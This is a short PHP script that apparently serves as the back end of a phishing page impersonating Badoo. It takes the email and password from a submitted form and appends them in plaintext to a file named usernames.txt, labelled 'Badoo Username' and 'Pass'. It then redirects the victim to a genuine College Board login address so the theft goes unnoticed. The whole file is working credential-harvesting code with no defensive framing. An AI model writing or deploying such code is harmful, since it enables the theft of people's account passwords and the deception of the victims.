<?php

file_put_contents("usernames.txt", "Badoo Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://prod.idp.collegeboard.org/');
exit();
?>
